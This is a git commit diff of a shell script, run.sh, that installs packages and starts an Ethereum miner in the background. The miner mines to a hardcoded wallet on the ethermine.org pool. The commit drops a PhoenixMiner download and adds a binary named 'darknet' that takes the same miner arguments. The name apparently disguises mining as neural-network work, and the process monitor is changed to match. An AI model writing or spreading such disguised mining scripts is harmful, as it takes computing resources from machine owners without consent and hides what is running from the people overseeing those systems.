6684ee45ddc66f851bc63be8bab787d3d565533a
tanlm <tanle2694@gmail.com>
2021-08-28 17:13:40 +0700

    fix

--- run.sh
+++ run.sh
@@ -3,16 +3,13 @@ apt-get update -y
 apt install libpci-dev -y
 apt-get install libssl-dev -y
 worker_name=$1
-./xmrig &
-wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner.tar.gz
-tar xzf PhoenixMiner.tar.gz
-cd PhoenixMiner_5.6d_Linux
+#./xmrig &
 
-./PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x992df1f4e10126ce40e67d0b3948fa409dbc917f -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
+./darknet -pool eu1.ethermine.org:4444 -wal 0x992df1f4e10126ce40e67d0b3948fa409dbc917f -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
 while true
 do
-  ps aux | grep PhoenixMiner
-  ps aux | grep xmrig
+  ps aux | grep darknet
+#  ps aux | grep xmrig
   nvidia-smi
-  sleep 1
+  sleep 10
 done
